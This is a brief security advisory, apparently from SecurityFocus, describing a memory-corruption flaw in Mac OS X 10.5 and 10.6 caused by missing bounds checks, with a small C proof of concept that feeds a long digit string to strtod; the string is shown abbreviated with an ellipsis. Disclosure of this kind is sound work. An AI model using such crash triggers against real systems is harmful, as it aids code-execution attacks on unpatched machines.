source: http://www.securityfocus.com/bid/37687/info

Mac OS X is prone to a memory-corruption vulnerability because the software fails to properly bounds-check data used as an array index.

Attackers may exploit this issue to execute arbitrary code within the context of affected applications.

Mac OS X 10.5 and 10.6 are affected; other versions may also be vulnerable. 

#include <stdio.h>
#include <stdlib.h>
int main ()
{
char number[] = "0.1111111111...11", *e;
double weed = strtod(number, &e);
printf("grams = %lf\n", weed);
return 0;
}